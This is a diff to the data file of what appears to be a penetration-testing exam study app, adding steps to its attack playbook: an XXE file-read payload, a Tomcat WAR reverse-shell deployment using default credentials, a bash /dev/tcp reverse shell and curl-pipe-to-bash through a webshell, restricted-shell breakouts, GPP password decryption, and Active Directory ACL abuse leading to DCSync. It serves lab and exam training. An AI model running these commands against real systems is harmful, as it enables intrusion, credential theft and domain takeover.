@@ -623,6 +623,8 @@ const TRACKS=[
     l:"PayloadsAllTheThings has the per-DBMS payloads. On exam, manual only."},
    {d:"Local file inclusion, then escalate to RCE",c:"curl 'http://{HOST}/?page=../../../../etc/passwd'",
     l:"LFI + log poisoning or PHP wrappers (php://filter, data://) is a classic route to RCE."},
+   {d:"XML external entity (XXE) on any endpoint that parses XML",c:"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+    l:"Send it where the app accepts XML (SOAP, SAML, an upload, a POST body). Reads local files \u2014 /etc/passwd, an SSH key, a web.config. Use <code>php://filter/convert.base64-encode/resource=</code> for PHP source, or an external DTD for blind/OOB XXE. PayloadsAllTheThings has the variants."},
    {d:"Server-side template injection",c:"# probe {{7*7}} / ${7*7} / <%= 7*7 %> ; a 49 back means SSTI, then engine-specific RCE",
     l:"HackTricks SSTI page maps each engine to its exploit payload."},
    {d:"Command injection and SSRF on any field that hits the OS or a URL",c:"# ; | `id` $(id) for cmdi ; internal URLs / 169.254.169.254 for SSRF",
@@ -635,6 +637,8 @@ const TRACKS=[
     l:"Upload <code>shell.php</code>, start <code>rlwrap nc -lvnp {LPORT}</code>, then browse to it to fire the shell. Or generate one in the Shells tool (msfvenom php/reverse_php)."},
    {d:"Bypass an extension or content-type filter if the upload is fussy",c:"# try .phtml .php5 .php7 .phar ; double extension shell.php.jpg ; prepend GIF89a magic bytes ; swap Content-Type to image/png",
     l:"Find where uploads land (your dir brute helps), then browse to the uploaded file."},
+   {d:"Tomcat Manager: deploy a WAR for a shell (try default creds first)",c:"# defaults: tomcat:tomcat  tomcat:s3cret  admin:admin  at /manager/html\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o rev.war\ncurl -u tomcat:s3cret -T rev.war 'http://{HOST}:8080/manager/text/deploy?path=/rev'\ncurl 'http://{HOST}:8080/rev/'   # listener up first; triggers the shell",
+    l:"Very common on Java boxes (Jerry, Tabby). The Shells tool also generates the WAR. <code>/manager/text</code> is the scriptable API; brute the login with the default-creds list if the obvious pairs fail."},
    {d:"Turn a command-only webshell into a reverse shell",c:"curl -G \"http://{HOST}/cmd.php\" --data-urlencode \"cmd=bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'\"",
     l:"Listener up first. Or host rev.sh and call <code>?cmd=curl+{LHOST}/rev.sh|bash</code>. Payloads come from the Shells tool."},
    {d:"Start the listener before you trigger anything",c:"rlwrap nc -lvnp {LPORT}",
@@ -675,11 +679,14 @@ const TRACKS=[
    {d:"2. Press Ctrl-Z to background it \u2014 lands you back on your own Kali prompt",c:"# keypress, no command: just hit  Ctrl-Z"},
    {d:"3. On your LOCAL Kali box. Paste both lines together \u2014 screen goes blank/no-echo, that's normal, press Enter",c:"stty raw -echo\nfg"},
    {d:"4. Back on the TARGET: fix the environment",c:"export TERM=xterm\nexport SHELL=/bin/bash"},
-   {d:"5. Size it: run  stty size  in a spare Kali tab to get 'rows cols', then set them on the TARGET",c:"stty rows 38 cols 190"}
+   {d:"5. Size it: run  stty size  in a spare Kali tab to get 'rows cols', then set them on the TARGET",c:"stty rows 38 cols 190"},
+   {d:"Landed in a restricted shell (rbash/rksh)? break out",c:"ssh {USER}@{IP} -t bash --noprofile --norc   # ask for bash at login\n# already in: vi -> :set shell=/bin/sh :shell   |   or  python3 -c 'import os;os.system(\"/bin/bash\")'\n# PATH/builtins limited: export PATH=/bin:/usr/bin; /bin/bash",
+    l:"A restricted shell blocks cd, /, and PATH changes. Request <code>bash</code> at SSH login, or break out through any program that spawns a shell (vi, less, awk, find, man \u2014 GTFOBins lists them)."}
  ],tips:["Host files with <code>python3 -m http.server 80</code>, pull with wget or curl.","Keep the listener in its own tmux pane."]},
  {n:2,title:"Local enumeration",tag:"recon",goal:"Find the escalation path",steps:[
    {d:"Check sudo rights first, the fastest win",c:"sudo -l",l:"Anything listed almost certainly has an exact escalation on <b>GTFOBins</b>."},
    {d:"Run the enum script, then actually read it",c:"./linpeas.sh | tee loot/linpeas.txt",l:"The red and yellow highlights are the point. Do not scroll past them."},
+   {d:"Watch for cron jobs and hidden processes without root",c:"./pspy64 -pf -i 1000   # wget it from your box first",l:"<b>pspy</b> shows every process and cron as it fires, including root ones you cannot see in <code>ps</code>. The fastest way to spot a root cron running a writable script \u2014 the SolidState/Nibbles pattern."},
    {d:"SUID binaries and capabilities",c:"find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null",l:"Both map straight to GTFOBins entries."},
    {d:"Cron jobs and writable scripts",c:"cat /etc/crontab; ls -la /etc/cron*",l:"A root cron running a writable script is game over."},
    {d:"Hunt for creds in configs, history and web roots",c:"cat ~/.bash_history; grep -riE 'password|passwd|secret' /var/www /etc 2>/dev/null",l:"Reused passwords escalate more boxes than any exploit."},
@@ -746,11 +753,12 @@ const TRACKS=[
    {d:"Validate and see where the cred works",c:"nxc smb {IP} -u {USER} -p {PASS}    # (Pwn3d! means local admin there)",l:"Run it across the whole range to find where this account is admin."},
    {d:"Collect BloodHound data",c:"bloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -ns {IP} -c all --zip",l:"Do this early. It draws the shortest path to Domain Admin for you."},
    {d:"Kerberoast service accounts",c:"impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {IP} -request",l:"Crack $krb5tgs$ offline (hashcat -m 13100). Service accounts often have weak passwords."},
-   {d:"Read shares and GPP for more creds",c:"nxc smb {IP} -u {USER} -p {PASS} -M gpp_password; nxc smb {IP} -u {USER} -p {PASS} --shares",l:"SYSVOL GPP passwords and readable shares are common cred sources."}
+   {d:"Read shares and GPP for more creds",c:"nxc smb {IP} -u {USER} -p {PASS} -M gpp_password; nxc smb {IP} -u {USER} -p {PASS} --shares",l:"SYSVOL GPP passwords and readable shares are common cred sources."},
+   {d:"Found a Groups.xml by hand (anonymous share / no creds)? decrypt the cpassword",c:"gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'",l:"When you pull <code>Groups.xml</code> from a readable share yourself (e.g. the Replication share on a null session), the <code>cpassword</code> is AES-encrypted with a key Microsoft published. <code>gpp-decrypt</code> reverses it. This is the whole of the <i>Active</i> box."}
  ]},
  {n:3,title:"Find the path",tag:"recon",goal:"Pick the route to higher privilege",steps:[
    {d:"In BloodHound, mark owned and query shortest paths",c:"# Shortest Paths to Domain Admins / from Owned Principals",l:"Look for ACL edges (GenericAll, WriteDACL, ForceChangePassword, AddMember) and delegation."},
-   {d:"Abuse the ACL the graph shows",c:"# e.g. ForceChangePassword: net rpc password <target> -U {DOMAIN}/{USER}%{PASS} -S {IP}",l:"Each edge has a known abuse. The Hacker Recipes lists the exact command per edge."}
+   {d:"Abuse the ACL the graph shows",c:"# ForceChangePassword: net rpc password <target> -U {DOMAIN}/{USER}%{PASS} -S {IP}\n# GenericAll on a group (add yourself):  net rpc group addmem '<group>' {USER} -U {DOMAIN}/{USER}%{PASS} -S {IP}\n# WriteDACL on the domain -> grant yourself DCSync, then secretsdump:\n#   Add-DomainObjectAcl -PrincipalIdentity {USER} -TargetIdentity '{DOMAIN}\\Domain Admins' -Rights DCSync",l:"Each BloodHound edge has a known abuse. ForceChangePassword / GenericAll / WriteDACL are the common ones; the WriteDACL\u2192DCSync grant is the <i>Forest</i> path. The Hacker Recipes lists the exact command per edge."}
  ]},
  {n:4,title:"Lateral movement",tag:"attack",goal:"Execute on other hosts with what you have",steps:[
    {d:"Pass the hash or password to a shell",c:"impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{IP}    # or -hashes LM:NT",l:"psexec, smbexec, wmiexec, atexec, or evil-winrm all take -H for a hash."},
@@ -957,7 +965,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.2.1";
+const APP_VERSION="1.2.2";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
